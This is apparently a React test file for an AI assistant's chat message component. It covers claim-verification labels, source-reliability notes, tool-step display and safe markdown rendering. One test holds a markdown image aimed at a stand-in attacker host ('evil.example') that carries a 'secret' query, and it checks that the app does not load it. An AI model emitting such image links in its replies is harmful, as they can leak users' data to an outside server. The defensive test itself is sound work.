import { describe, it, expect } from 'vitest'
import type { AnswerClaim } from '@buildaharness/aielia'
import { answerClaimLabel } from './ChatMessageBubble'

function claim(verification_status: AnswerClaim['verification_status']): AnswerClaim {
  return {
    evidence: [],
    confidence: 0.5,
    freshness: null,
    source_type: 'model_reasoning',
    verification_status,
  }
}

// Golden-output test: pins the exact phrasing difference between "this is true" and "I found X
// but couldn't independently verify it" so a future change can't silently collapse the four
// branches back into one generic phrasing (Phase 6 of the harness/assistant remediation plan).
describe('answerClaimLabel', () => {
  it('renders distinct, non-overlapping phrasing for each verification_status branch', () => {
    expect(answerClaimLabel(claim('verified'))).toBe(
      'Checked against the source material I read — the reply matches it.',
    )
    expect(answerClaimLabel(claim('unverified_attempted'))).toBe(
      "I found evidence for this, but couldn't independently verify it.",
    )
    expect(answerClaimLabel(claim('contradicted'))).toBe(
      'This conflicts with something I already believe — worth double-checking.',
    )
    expect(answerClaimLabel(claim('no_evidence'))).toBe(
      'This is my own reasoning, not backed by anything I looked up.',
    )
  })

  it('surfaces the grounding discrepancy when the reply did not match the tool results', () => {
    expect(answerClaimLabel({ ...claim('unverified_attempted'), grounding_note: 'the stated total 4058 is not the sum of the line items (4508)' })).toBe(
      "I found evidence for this, but the reply doesn't fully match it: the stated total 4058 is not the sum of the line items (4508)",
    )
  })

  it('never lets "verified" and "unverified_attempted" collapse to the same phrasing', () => {
    expect(answerClaimLabel(claim('verified'))).not.toBe(answerClaimLabel(claim('unverified_attempted')))
  })
})

describe('ChatMessageBubble — lower-confidence source line', () => {
  const trace = { layerActivity: [], verificationHealth: { strength: 1, feasibility: 1 } } as never
  const withEvidence = (evidence: AnswerClaim['evidence']): AnswerClaim => ({ ...claim('unverified_attempted'), evidence })

  async function whyText(answerClaim: AnswerClaim): Promise<string> {
    const { render, screen, fireEvent } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(<ChatMessageBubble role="assistant" content="hi" trace={trace} answerClaim={answerClaim} />)
    fireEvent.click(screen.getByText('Why?'))
    return container.textContent ?? ''
  }

  it('shows a LOW-assessed source in the Why? panel', async () => {
    const text = await whyText(withEvidence([{ id: 'source-reliability:notes/old-wiki.md', obs: 'notes/old-wiki.md — archived forum copy', reliability: 'LOW', source: 'notes/old-wiki.md', evidence_type: 'OBSERVATION', freshness: '2026-09-29T00:00:00.000Z' }]))
    expect(text).toContain('Less reliable source: notes/old-wiki.md — archived forum copy')
  })

  it('stays quiet when no source was judged LOW', async () => {
    const text = await whyText(withEvidence([]))
    expect(text).not.toContain('Less reliable source')
  })
})

describe('ChatMessageBubble — details row, code blocks, why chain', () => {
  const ev = (layer: string, fired = true) => ({ layer, fired, reason: `${layer} ran` })
  const loop = ['hypothesis', 'diagnostics', 'execution'].map((l) => ev(l))
  const trace = { layerActivity: [...loop, ...loop, ...loop], verificationHealth: { strength: 1, feasibility: 1 } } as never

  it('puts Sources / Steps / Why? / Run detail in one Details group and counts distinct sources', async () => {
    const { render, screen, within } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    render(
      <ChatMessageBubble
        role="assistant" content="hi" trace={trace}
        sources={[
          { tool: 'read_file', path: 'a.md' }, { tool: 'read_file', path: 'a.md' },
          { tool: 'web_search', path: 'q' }, { tool: 'fetch_url', path: 'https://x' },
        ] as never}
        toolSteps={[{ summary: 's1' }] as never}
      />,
    )
    const group = screen.getByRole('group', { name: 'Details' })
    for (const name of ['Sources (3)', 'Steps (1)', 'Why?', 'Run detail ▾']) {
      expect(within(group).getByRole('button', { name })).toBeTruthy()
    }
  })

  it('lists a finished write/command step as done and keeps a denied one as it was reported', async () => {
    const { render, screen, fireEvent } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    render(
      <ChatMessageBubble
        role="assistant" content="hi"
        toolSteps={[
          { tool: 'run_shell_command', input: { command: 'uname -a' }, summary: 'Proposing to run: uname -a' },
          { tool: 'write_file', input: { path: 'x.md' }, summary: 'Proposing a write to x.md' },
          { tool: 'write_file', input: { path: 'y.md' }, summary: 'Proposing a write to y.md', deniedReason: 'outside workspace' },
        ] as never}
      />,
    )
    fireEvent.click(screen.getByText('Steps (3)'))
    expect(screen.getByText('Ran: uname -a')).toBeTruthy()
    expect(screen.getByText('Wrote x.md')).toBeTruthy()
    expect(screen.getByText('Proposing a write to y.md')).toBeTruthy()
  })

  it('collapses a repeated layer loop in the Why? chain into ×3 and shows a legend', async () => {
    const { render, screen, fireEvent } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(<ChatMessageBubble role="assistant" content="hi" trace={trace} />)
    fireEvent.click(screen.getByText('Why?'))
    expect(container.textContent).toContain('×3')
    expect(container.querySelectorAll('.bubble__why-chain-code')).toHaveLength(3)
    expect(container.querySelector('.bubble__why-legend')?.textContent).toContain(' = ')
  })

  it('wraps fenced code in a block with a language label and Copy button', async () => {
    const { render } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(<ChatMessageBubble role="assistant" content={'```bash\nls -la\n```'} />)
    expect(container.querySelector('.bubble__code-lang')?.textContent).toBe('bash')
    expect(container.querySelector('button[aria-label="Copy code"]')).toBeTruthy()
  })
})

describe('ChatMessageBubble — untrusted markdown', () => {
  it('does not render an auto-loading image and opens links without navigating the app window', async () => {
    const { render } = await import('@testing-library/react')
    const { ChatMessageBubble } = await import('./ChatMessageBubble')
    const { container } = render(
      <ChatMessageBubble role="assistant" content={'![x](https://evil.example/?q=secret) [go](https://example.com)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('image not loaded')
    const link = container.querySelector('a')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toContain('noopener')
  })
})
